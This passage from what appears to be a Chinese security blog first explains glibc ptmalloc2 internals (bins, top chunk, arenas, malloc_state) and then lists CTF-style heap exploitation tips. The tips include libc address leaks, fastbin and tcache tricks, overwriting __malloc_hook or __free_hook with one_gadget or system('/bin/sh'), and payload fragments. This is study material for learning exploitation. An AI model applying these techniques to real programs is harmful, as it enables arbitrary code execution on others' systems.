<figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NSMALLBINS 64</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SMALLBIN_WIDTH MALLOC_ALIGNMENT</span><br><span class="hljs-comment">// 是否需要对small bin的下标进行纠正</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MIN_LARGE_SIZE ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span><br><span class="hljs-comment">//判断chunk的大小是否在small bin范围内</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> in_smallbin_range(sz)                                                  \</span><br><span class="hljs-meta">    ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)</span><br><span class="hljs-comment">// 根据chunk的大小得到small bin对应的索引。</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> smallbin_index(sz)                                                     \</span><br><span class="hljs-meta">    ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4)                          \</span><br><span class="hljs-meta">                           : (((unsigned) (sz)) &gt;&gt; 3)) +                       \</span><br><span class="hljs-meta">     SMALLBIN_CORRECTION)</span><br></code></pre></td></tr></table></figure>

<p><strong>或许，大家会很疑惑，那 fastbin 与 small bin 中 chunk 的大小会有很大一部分重合啊，那 small bin 中对应大小的 bin 是不是就没有什么作用啊？</strong> 其实不然，fast bin 中的 chunk 是有可能被放到 small bin 中去的，我们在后面分析具体的源代码时会有深刻的体会。</p>
<h4 id="Large-Bin"><a href="#Large-Bin" class="headerlink" title="Large Bin"></a>Large Bin</h4><p>large bins 中一共包括 63 个 bin，每个 bin 中的 chunk 的大小不一致，而是处于一定区间范围内。此外，这 63 个 bin 被分成了 6 组，每组 bin 中的 chunk 大小之间的公差一致，具体如下：</p>
<table>
<thead>
<tr>
<th>组</th>
<th>数量</th>
<th>公差</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>32</td>
<td>64B</td>
</tr>
<tr>
<td>2</td>
<td>16</td>
<td>512B</td>
</tr>
<tr>
<td>3</td>
<td>8</td>
<td>4096B</td>
</tr>
<tr>
<td>4</td>
<td>4</td>
<td>32768B</td>
</tr>
<tr>
<td>5</td>
<td>2</td>
<td>262144B</td>
</tr>
<tr>
<td>6</td>
<td>1</td>
<td>不限制</td>
</tr>
</tbody></table>
<p>这里我们以 32 位平台的 large bin 为例，第一个 large bin 的起始 chunk 大小为 512 字节，位于第一组，所以该bin 可以存储的 chunk 的大小范围为 [512,512+64)。</p>
<p>关于 large bin 的宏如下，这里我们以 32 位平台下，第一个 large bin 的起始 chunk 大小为例，为 512 字节，那么 512&gt;&gt;6 = 8，所以其下标为56+8=64。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> largebin_index_32(sz)                                                  \</span><br><span class="hljs-meta">    (((((unsigned long) (sz)) &gt;&gt; 6) &lt;= 38)                                     \</span><br><span class="hljs-meta">         ? 56 + (((unsigned long) (sz)) &gt;&gt; 6)                                  \</span><br><span class="hljs-meta">         : ((((unsigned long) (sz)) &gt;&gt; 9) &lt;= 20)                               \</span><br><span class="hljs-meta">               ? 91 + (((unsigned long) (sz)) &gt;&gt; 9)                            \</span><br><span class="hljs-meta">               : ((((unsigned long) (sz)) &gt;&gt; 12) &lt;= 10)                        \</span><br><span class="hljs-meta">                     ? 110 + (((unsigned long) (sz)) &gt;&gt; 12)                    \</span><br><span class="hljs-meta">                     : ((((unsigned long) (sz)) &gt;&gt; 15) &lt;= 4)                   \</span><br><span class="hljs-meta">                           ? 119 + (((unsigned long) (sz)) &gt;&gt; 15)              \</span><br><span class="hljs-meta">                           : ((((unsigned long) (sz)) &gt;&gt; 18) &lt;= 2)             \</span><br><span class="hljs-meta">                                 ? 124 + (((unsigned long) (sz)) &gt;&gt; 18)        \</span><br><span class="hljs-meta">                                 : 126)</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> largebin_index_32_big(sz)                                              \</span><br><span class="hljs-meta">    (((((unsigned long) (sz)) &gt;&gt; 6) &lt;= 45)                                     \</span><br><span class="hljs-meta">         ? 49 + (((unsigned long) (sz)) &gt;&gt; 6)                                  \</span><br><span class="hljs-meta">         : ((((unsigned long) (sz)) &gt;&gt; 9) &lt;= 20)                               \</span><br><span class="hljs-meta">               ? 91 + (((unsigned long) (sz)) &gt;&gt; 9)                            \</span><br><span class="hljs-meta">               : ((((unsigned long) (sz)) &gt;&gt; 12) &lt;= 10)                        \</span><br><span class="hljs-meta">                     ? 110 + (((unsigned long) (sz)) &gt;&gt; 12)                    \</span><br><span class="hljs-meta">                     : ((((unsigned long) (sz)) &gt;&gt; 15) &lt;= 4)                   \</span><br><span class="hljs-meta">                           ? 119 + (((unsigned long) (sz)) &gt;&gt; 15)              \</span><br><span class="hljs-meta">                           : ((((unsigned long) (sz)) &gt;&gt; 18) &lt;= 2)             \</span><br><span class="hljs-meta">                                 ? 124 + (((unsigned long) (sz)) &gt;&gt; 18)        \</span><br><span class="hljs-meta">                                 : 126)</span><br><br><span class="hljs-comment">// XXX It remains to be seen whether it is good to keep the widths of</span><br><span class="hljs-comment">// XXX the buckets the same or whether it should be scaled by a factor</span><br><span class="hljs-comment">// XXX of two as well.</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> largebin_index_64(sz)                                                  \</span><br><span class="hljs-meta">    (((((unsigned long) (sz)) &gt;&gt; 6) &lt;= 48)                                     \</span><br><span class="hljs-meta">         ? 48 + (((unsigned long) (sz)) &gt;&gt; 6)                                  \</span><br><span class="hljs-meta">         : ((((unsigned long) (sz)) &gt;&gt; 9) &lt;= 20)                               \</span><br><span class="hljs-meta">               ? 91 + (((unsigned long) (sz)) &gt;&gt; 9)                            \</span><br><span class="hljs-meta">               : ((((unsigned long) (sz)) &gt;&gt; 12) &lt;= 10)                        \</span><br><span class="hljs-meta">                     ? 110 + (((unsigned long) (sz)) &gt;&gt; 12)                    \</span><br><span class="hljs-meta">                     : ((((unsigned long) (sz)) &gt;&gt; 15) &lt;= 4)                   \</span><br><span class="hljs-meta">                           ? 119 + (((unsigned long) (sz)) &gt;&gt; 15)              \</span><br><span class="hljs-meta">                           : ((((unsigned long) (sz)) &gt;&gt; 18) &lt;= 2)             \</span><br><span class="hljs-meta">                                 ? 124 + (((unsigned long) (sz)) &gt;&gt; 18)        \</span><br><span class="hljs-meta">                                 : 126)</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> largebin_index(sz)                                                     \</span><br><span class="hljs-meta">    (SIZE_SZ == 8 ? largebin_index_64(sz) : MALLOC_ALIGNMENT == 16             \</span><br><span class="hljs-meta">                                                ? largebin_index_32_big(sz)    \</span><br><span class="hljs-meta">                                                : largebin_index_32(sz))</span><br></code></pre></td></tr></table></figure>

<h4 id="Unsorted-Bin"><a href="#Unsorted-Bin" class="headerlink" title="Unsorted Bin"></a>Unsorted Bin</h4><p>unsorted bin 可以视为空闲 chunk 回归其所属 bin 之前的缓冲区。</p>
<p>其在 glibc 中具体的说明如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Unsorted chunks</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    All remainders from chunk splits, as well as all returned chunks,</span><br><span class="hljs-comment">    are first placed in the &quot;unsorted&quot; bin. They are then placed</span><br><span class="hljs-comment">    in regular bins after malloc gives them ONE chance to be used before</span><br><span class="hljs-comment">    binning. So, basically, the unsorted_chunks list acts as a queue,</span><br><span class="hljs-comment">    with chunks being placed on it in free (and malloc_consolidate),</span><br><span class="hljs-comment">    and taken off (to be either used or placed in bins) in malloc.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    The NON_MAIN_ARENA flag is never set for unsorted chunks, so it</span><br><span class="hljs-comment">    does not have to be taken into account in size comparisons.</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure>

<p>从下面的宏我们可以看出</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* The otherwise unindexable 1-bin is used to hold unsorted chunks. */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> unsorted_chunks(M) (bin_at(M, 1))</span><br></code></pre></td></tr></table></figure>

<p>unsorted bin 处于我们之前所说的 bin 数组下标 1 处。故而 unsorted bin 只有一个链表。unsorted bin 中的空闲 chunk 处于乱序状态，主要有两个来源</p>
<ul>
<li>当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。</li>
<li>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。关于 top chunk 的解释，请参考下面的介绍。</li>
</ul>
<p>此外，Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO 。</p>
<h4 id="common-macro"><a href="#common-macro" class="headerlink" title="common macro"></a>common macro</h4><p>这里介绍一些通用的宏。</p>
<p><strong>根据chunk的大小统一地获得chunk所在的索引</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> bin_index(sz)                                                          \</span><br><span class="hljs-meta">    ((in_smallbin_range(sz)) ? smallbin_index(sz) : largebin_index(sz))</span><br></code></pre></td></tr></table></figure>

<h3 id="Top-Chunk"><a href="#Top-Chunk" class="headerlink" title="Top Chunk"></a>Top Chunk</h3><p>glibc 中对于 top chunk 的描述如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Top</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    The top-most available chunk (i.e., the one bordering the end of</span><br><span class="hljs-comment">    available memory) is treated specially. It is never included in</span><br><span class="hljs-comment">    any bin, is used only if no other chunk is available, and is</span><br><span class="hljs-comment">    released back to the system if it is very large (see</span><br><span class="hljs-comment">    M_TRIM_THRESHOLD).  Because top initially</span><br><span class="hljs-comment">    points to its own bin with initial zero size, thus forcing</span><br><span class="hljs-comment">    extension on the first malloc request, we avoid having any special</span><br><span class="hljs-comment">    code in malloc to check whether it even exists yet. But we still</span><br><span class="hljs-comment">    need to do so when getting memory from system, so we make</span><br><span class="hljs-comment">    initial_top treat the bin as a legal but unusable chunk during the</span><br><span class="hljs-comment">    interval between initialization and the first call to</span><br><span class="hljs-comment">    sysmalloc. (This is somewhat delicate, since it relies on</span><br><span class="hljs-comment">    the 2 preceding words to be zero during this interval as well.)</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-comment">/* Conveniently, the unsorted bin can be used as dummy top on first call */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> initial_top(M) (unsorted_chunks(M))</span><br></code></pre></td></tr></table></figure>

<p>程序第一次进行 malloc 的时候，heap 会被分为两块，一块给用户，剩下的那块就是 top chunk。其实，所谓的top chunk 就是处于当前堆的物理地址最高的 chunk。这个 chunk 不属于任何一个 bin，它的作用在于当所有的bin 都无法满足用户请求的大小时，如果其大小不小于指定的大小，就进行分配，并将剩下的部分作为新的 top chunk。否则，就对heap进行扩展后再进行分配。在main arena中通过sbrk扩展heap，而在thread arena中通过mmap分配新的heap。</p>
<p>需要注意的是，top chunk 的 prev_inuse 比特位始终为1，否则其前面的chunk就会被合并到top chunk中。</p>
<p><strong>初始情况下，我们可以将 unsorted chunk 作为 top chunk。</strong></p>
<h3 id="last-remainder"><a href="#last-remainder" class="headerlink" title="last remainder"></a>last remainder</h3><p>在用户使用 malloc 请求分配内存时，ptmalloc2 找到的 chunk 可能并不和申请的内存大小一致，这时候就将分割之后的剩余部分称之为 last remainder chunk ，unsort bin 也会存这一块。top chunk 分割剩下的部分不会作为last remainder.</p>
<h2 id="宏观结构"><a href="#宏观结构" class="headerlink" title="宏观结构"></a>宏观结构</h2><h3 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h3><p>在我们之前介绍的例子中，无论是主线程还是新创建的线程，在第一次申请内存时，都会有独立的arena。那么会不会每个线程都有独立的arena呢？下面我们就具体介绍。</p>
<h4 id="arena-数量"><a href="#arena-数量" class="headerlink" title="arena 数量"></a>arena 数量</h4><p>对于不同系统，arena数量的<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/arena.c#L847">约束</a>如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">For 32 bit systems:<br>     Number of arena = 2 * number of cores.<br>For 64 bit systems:<br>     Number of arena = 8 * number of cores.<br></code></pre></td></tr></table></figure>

<p>显然，不是每一个线程都会有对应的 arena。至于为什么64位系统，要那么设置，我也没有想明白。此外，因为每个系统的核数是有限的，当线程数大于核数的二倍（超线程技术）时，就必然有线程处于等待状态，所以没有必要为每个线程分配一个 arena。</p>
<h4 id="arena-分配规则"><a href="#arena-分配规则" class="headerlink" title="arena 分配规则"></a>arena 分配规则</h4><p><strong>待补充。</strong></p>
<h4 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h4><p>与 thread 不同的是，main_arena 并不在申请的 heap 中，而是一个全局变量，在 libc.so 的数据段。</p>
<h3 id="heap-info"><a href="#heap-info" class="headerlink" title="heap_info"></a>heap_info</h3><p>程序刚开始执行时，每个线程是没有 heap 区域的。当其申请内存时，就需要一个结构来记录对应的信息，而heap_info 的作用就是这个。而且当该heap的资源被使用完后，就必须得再次申请内存了。此外，一般申请的heap 是不连续的，因此需要记录不同heap之间的链接结构。</p>
<p><strong>该数据结构是专门为从 Memory Mapping Segment 处申请的内存准备的，即为非主线程准备的。</strong></p>
<p>主线程可以通过 sbrk() 函数扩展 program break location 获得（直到触及Memory Mapping Segment），只有一个heap，没有 heap_info 数据结构。</p>
<p>heap_info 的主要结构如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> HEAP_MIN_SIZE (32 * 1024)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> HEAP_MAX_SIZE</span><br><span class="hljs-meta"># <span class="hljs-meta-keyword">ifdef</span> DEFAULT_MMAP_THRESHOLD_MAX</span><br><span class="hljs-meta">#  <span class="hljs-meta-keyword">define</span> HEAP_MAX_SIZE (2 * DEFAULT_MMAP_THRESHOLD_MAX)</span><br><span class="hljs-meta"># <span class="hljs-meta-keyword">else</span></span><br><span class="hljs-meta">#  <span class="hljs-meta-keyword">define</span> HEAP_MAX_SIZE (1024 * 1024) <span class="hljs-comment">/* must be a power of two */</span></span><br><span class="hljs-meta"># <span class="hljs-meta-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br><span class="hljs-comment">/* HEAP_MIN_SIZE and HEAP_MAX_SIZE limit the size of mmap()ed heaps</span><br><span class="hljs-comment">   that are dynamically created for multi-threaded programs.  The</span><br><span class="hljs-comment">   maximum size must be a power of two, for fast determination of</span><br><span class="hljs-comment">   which heap belongs to a chunk.  It should be much larger than the</span><br><span class="hljs-comment">   mmap threshold, so that requests with a size just below that</span><br><span class="hljs-comment">   threshold can be fulfilled without creating too many heaps.  */</span><br><br><span class="hljs-comment">/***************************************************************************/</span><br><br><span class="hljs-comment">/* A heap is a single contiguous memory region holding (coalesceable)</span><br><span class="hljs-comment">   malloc_chunks.  It is allocated with mmap() and always starts at an</span><br><span class="hljs-comment">   address aligned to HEAP_MAX_SIZE.  */</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">heap_info</span></span><br><span class="hljs-class">&#123;</span><br>  mstate ar_ptr; <span class="hljs-comment">/* Arena for this heap. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">heap_info</span> *<span class="hljs-title">prev</span>;</span> <span class="hljs-comment">/* Previous heap. */</span><br>  <span class="hljs-keyword">size_t</span> size;   <span class="hljs-comment">/* Current size in bytes. */</span><br>  <span class="hljs-keyword">size_t</span> mprotect_size; <span class="hljs-comment">/* Size in bytes that has been mprotected</span><br><span class="hljs-comment">                           PROT_READ|PROT_WRITE.  */</span><br>  <span class="hljs-comment">/* Make sure the following data is properly aligned, particularly</span><br><span class="hljs-comment">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span><br><span class="hljs-comment">     MALLOC_ALIGNMENT. */</span><br>  <span class="hljs-keyword">char</span> pad[<span class="hljs-number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];<br>&#125; heap_info;<br></code></pre></td></tr></table></figure>

<p>该结构主要是描述堆的基本信息，包括</p>
<ul>
<li>堆对应的 arena 的地址</li>
<li>由于一个线程申请一个堆之后，可能会使用完，之后就必须得再次申请。因此，一个线程可能会有多个堆。prev即记录了上一个 heap_info 的地址。这里可以看到每个堆的 heap_info 是通过单向链表进行链接的。</li>
<li>size 表示当前堆的大小</li>
<li>最后一部分确保对齐（<strong>这里负数使用的缘由是什么呢</strong>？）</li>
</ul>
<p>看起来该结构应该是相当重要的，但是如果如果我们仔细看完整个 malloc 的实现的话，就会发现它出现的频率并不高。</p>
<h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><p>该结构用于管理堆，记录每个 arena 当前申请的内存的具体状态，比如说是否有空闲chunk，有什么大小的空闲chunk 等等。无论是 thread arena 还是 main arena，它们都只有一个 malloc state 结构。由于 thread 的 arena 可能有多个，malloc state结构会在最新申请的arena中。</p>
<p><strong>注意，main arena 的 malloc_state 并不是 heap segment 的一部分，而是一个全局变量，存储在 libc.so 的数据段。</strong></p>
<p>其结构如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> &#123;</span><br>    <span class="hljs-comment">/* Serialize access.  */</span><br>    __libc_lock_define(, mutex);<br><br>    <span class="hljs-comment">/* Flags (formerly in max_fast).  */</span><br>    <span class="hljs-keyword">int</span> flags;<br><br>    <span class="hljs-comment">/* Fastbins */</span><br>    mfastbinptr fastbinsY[ NFASTBINS ];<br><br>    <span class="hljs-comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span><br>    mchunkptr top;<br><br>    <span class="hljs-comment">/* The remainder from the most recent split of a small request */</span><br>    mchunkptr last_remainder;<br><br>    <span class="hljs-comment">/* Normal bins packed as described above */</span><br>    mchunkptr bins[ NBINS * <span class="hljs-number">2</span> - <span class="hljs-number">2</span> ];<br><br>    <span class="hljs-comment">/* Bitmap of bins, help to speed up the process of determinating if a given bin is definitely empty.*/</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> binmap[ BINMAPSIZE ];<br><br>    <span class="hljs-comment">/* Linked list, points to the next arena */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next</span>;</span><br><br>    <span class="hljs-comment">/* Linked list for free arenas.  Access to this field is serialized</span><br><span class="hljs-comment">       by free_list_lock in arena.c.  */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next_free</span>;</span><br><br>    <span class="hljs-comment">/* Number of threads attached to this arena.  0 if the arena is on</span><br><span class="hljs-comment">       the free list.  Access to this field is serialized by</span><br><span class="hljs-comment">       free_list_lock in arena.c.  */</span><br>    INTERNAL_SIZE_T attached_threads;<br><br>    <span class="hljs-comment">/* Memory allocated from the system in this arena.  */</span><br>    INTERNAL_SIZE_T system_mem;<br>    INTERNAL_SIZE_T max_system_mem;<br>&#125;;<br></code></pre></td></tr></table></figure>

<ul>
<li><p>__libc_lock_define(, mutex);</p>
<ul>
<li>  该变量用于控制程序串行访问同一个分配区，当一个线程获取了分配区之后，其它线程要想访问该分配区，就必须等待该线程分配完成后才能够使用。</li>
</ul>
</li>
<li><p>flags</p>
<ul>
<li>  flags记录了分配区的一些标志，比如 bit0 记录了分配区是否有 fast bin chunk ，bit1 标识分配区是否能返回连续的虚拟地址空间。具体如下</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   FASTCHUNKS_BIT held in max_fast indicates that there are probably</span><br><span class="hljs-comment">   some fastbin chunks. It is set true on entering a chunk into any</span><br><span class="hljs-comment">   fastbin, and cleared only in malloc_consolidate.</span><br><span class="hljs-comment">   The truth value is inverted so that have_fastchunks will be true</span><br><span class="hljs-comment">   upon startup (since statics are zero-filled), simplifying</span><br><span class="hljs-comment">   initialization checks.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FASTCHUNKS_BIT (1U)</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> have_fastchunks(M) (((M)-&gt;flags &amp; FASTCHUNKS_BIT) == 0)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> clear_fastchunks(M) catomic_or(&amp;(M)-&gt;flags, FASTCHUNKS_BIT)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_fastchunks(M) catomic_and(&amp;(M)-&gt;flags, ~FASTCHUNKS_BIT)</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   NONCONTIGUOUS_BIT indicates that MORECORE does not return contiguous</span><br><span class="hljs-comment">   regions.  Otherwise, contiguity is exploited in merging together,</span><br><span class="hljs-comment">   when possible, results from consecutive MORECORE calls.</span><br><span class="hljs-comment">   The initial value comes from MORECORE_CONTIGUOUS, but is</span><br><span class="hljs-comment">   changed dynamically if mmap is ever used as an sbrk substitute.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NONCONTIGUOUS_BIT (2U)</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> contiguous(M) (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) == 0)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> noncontiguous(M) (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) != 0)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_noncontiguous(M) ((M)-&gt;flags |= NONCONTIGUOUS_BIT)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_contiguous(M) ((M)-&gt;flags &amp;= ~NONCONTIGUOUS_BIT)</span><br><br><span class="hljs-comment">/* ARENA_CORRUPTION_BIT is set if a memory corruption was detected on the</span><br><span class="hljs-comment">   arena.  Such an arena is no longer used to allocate chunks.  Chunks</span><br><span class="hljs-comment">   allocated in that arena before detecting corruption are not freed.  */</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ARENA_CORRUPTION_BIT (4U)</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> arena_is_corrupt(A) (((A)-&gt;flags &amp; ARENA_CORRUPTION_BIT))</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_arena_corrupt(A) ((A)-&gt;flags |= ARENA_CORRUPTION_BIT)</span><br><br></code></pre></td></tr></table></figure>

<ul>
<li>fastbinsY[NFASTBINS]<ul>
<li>  存放每个 fast chunk 链表头部的指针</li>
</ul>
</li>
<li>top<ul>
<li>  指向分配区的 top chunk</li>
</ul>
</li>
<li>last_reminder<ul>
<li>  最新的 chunk 分割之后剩下的那部分</li>
</ul>
</li>
<li>bins<ul>
<li>  用于存储 unstored bin，small bins 和 large bins 的 chunk 链表。</li>
</ul>
</li>
<li>binmap<ul>
<li>  ptmalloc 用一个 bit 来标识某一个 bin 中是否包含空闲 chunk 。</li>
</ul>
</li>
</ul>
]]></content>
      <tags>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>堆二三事</title>
    <url>/2021/04/18/2021-04-18-%E5%A0%86%E4%BA%8C%E4%B8%89%E4%BA%8B/</url>
    <content><![CDATA[<h1 id="一些关于堆的小知识点"><a href="#一些关于堆的小知识点" class="headerlink" title="一些关于堆的小知识点"></a>一些关于堆的小知识点</h1><p>（没有顺序，知识点是零散的，都是我自己学到一点，记录下一点）</p>
<p>1、当small chunk只有一个时，如果被释放了，会被划分到unsorted bin里面，如果只有一个时，该chunk的fd和bk都指向libc中的地址，可以借此算出libc_base</p>
<p>2、当先调用了mmap函数时，malloc系列函数申请的chunk的地址是从heap的起始地址开始分配的，又有页（4KB）是内存分配的最小单位，导致heap地址的最低三位总是0x000。因此申请的chunk可以只要覆盖地址最低两位进行修改其fd和bk的值</p>
<p>3、在利用malloc_hook（__malloc_hook是一个弱类型的函数指针变量，指向void * function(size_t size void * caller)，当调用malloc系列函数时，会判断hook指针是否为空，不为空则调用它）函数时，要使用错位偏移，即为把<strong>hook函数地址-0x30+0xd（有时候也可以找找hook地址-0x20+0x5）</strong>。此时，在写上p8(0)*3+p64(one_gadget)即可获取shell（似乎有些不准确，虽然有的确实行的通，但是更全面的应该是检验的size位置是int类型的函数，所以我们应该查看低32位的数，所以不局限-0x20，可能是0x30，0x38等等，在gdb里面调试发现即可）</p>
<p>4、hook函数指针位置在<code>main_arena-0x10</code>处，在gdb中该地址的指令格式应为如此:<code>x/10gx (long long) &amp;main_arena-0x30</code></p>
<p>5、chunk的size字段的最末位的三个比特位被用作状态标识，所以，size字段的以16进制表示时，最后一位16进制数是不能算到size里面的</p>
<p>6、一个chunk的大小最小是0x20(32字节64位系统下)，或者0x10(16字节32位系统下)</p>
<p>7、在Glibc2.26之后的版本出现了Tcache机制，在64位情况下，tcache优先于其他bin链接收释放掉的0×20<del>0×410大小的堆块（32位下0xC</del>0x200），tcache最多可以接收7个chunk，多出的部分将按照原来Glibc版本里面的方式分配。</p>
<p>并且从tcache分配出去的chunk并不会检查被分配位置的size大小，也就是不必像之前的版本使用错位偏移来使size符合检查</p>
<p>利用Tcache泄露libc有以下几种方法：</p>
<ul>
<li>申请8个大堆块，释放8个，这里堆块大小，大于fastbin范围，就是填满tcache，让第八个进入unsorted bin中</li>
<li>有double free的情况下，连续free 8次同一个堆块，这里堆块大小，大于fastbin范围</li>
<li>申请大堆块，大于0×410</li>
<li>修改堆上的Tcache管理结构，把count值改为7，然后再次free一个该大小的chunk，注意防止chunk被top chunk合并</li>
</ul>
<p>以上都可以让chunk的fd和bk指针指向libc的某个位置而泄露地址</p>
<p>8、当修改hook函数为one_gadget发现所有给的execve都不行时，这时需要我们借用__libc_realloc去调整栈的参数，使execve的环境被满足才可以利用成功。__libc_realloc的地址是__malloc_hook-0x8。因为调用realloc会执行许多的push指令，可以把rsp调整到满足环境。要查看push操作，可以把__libc_realloc地址加上n，指向的都是push指令</p>
<p>操作：把one_gadget写到__relloc_hook地址上，在使用malloc函数的会进行调用；在__malloc_hook地址写上__libc_realloc+n(就会先执行__libc_realloc+n调整，再执行one_gadget)</p>
<p>9、堆题libc都很重要,题目没给libc，如果存在double free，可以用其测试libc版本</p>
<ul>
<li>如果报fastbin double free 那就是2.23~2.26<ul>
<li>2.23下会检查free的fastbin chunk是不是fastbin链表中的第一个chunk</li>
</ul>
</li>
<li>如果没报错那就是2.27~2.28<ul>
<li>因为有tcahce,2.27的tcache没有任何检查</li>
</ul>
</li>
<li>如果报tcache double free那么就是2.29及其以上<ul>
<li>因为2.29以后tcache增加了key字段防止tcache double free</li>
</ul>
</li>
</ul>
<p>10、chunk的三个标志位：从高到低依次表示为：non_main_arena、is_mmap、prev_inuse</p>
<p>non_main_arena：0表示当前chunk是属于main_arena，1表示属于</p>
<p>is_mmap：1表示当前chunk是使用mmap申请的，0表示不是</p>
<p>prev_inuse：1表示前一个chunk在被用户使用，0表示前一个chunk被释放</p>
<p>11、如果申请的chunk大小为0x60和0x68返回的是一样大小的chunk，而0x68多出的8个字节是使用了后一个chunk的presize</p>
<p>12、大小属于fastbinchunk被free的时候，不会改变next chunk的prev_inuse</p>
<p>13、想要让chunk进入small bins 或者large bins，则前提是释放的chunk大小先达到small bins 或者large bins的大小范围，该chunk先进入到unsorted bin，然后再申请一次堆块，申请的大小要大于之前释放的chunk，那么之前释放的chunk就会进入到small bins 或者large bins（唯一办法）</p>
<p>14、如果从unsortedbin中分配出chunk，是从大chunk的头部开始分配的，分配完申请的大小之后把大chunk剩下的继续留在unsortedbin中</p>
<p>15、unsortedbin中的chunk重新分配出来时，里面的数据不会被系统清空（如果程序没动的话），所以里面还是存在着libc的一个地址，可以通过写满8个A来进行定位bk的内容</p>
<p>16、getshell有个办法是：修改free_hook内容为system地址，然后free一个chunk，chunk内容为”/bin/sh”，就相当于执行了system(“/bin/sh”)</p>
<p>17、在libc版本2.23及以下的时候，使用one_gadget稳定getshell，可以使用条件为[rsp+0x50] == NULL的one_gadget，然后对同一个chunk进行double free（指针没有置0）即可getshell</p>
<p>18、当把malloc_hook劫持为one_gadget失败时，除了可以去调整栈之外，还可以换思路去劫持free_hook，就是16中的办法，或者是劫持realloc（在malloc_hook-0x8的地方），往realloc_hook中写入one_gadget,malloc_hook中写入realloc函数的地址</p>
<p>19、因为free_hook前面是不存在像malloc_hook一样的0x7f的信息，所以无法将fastchunk分配过去</p>
<ul>
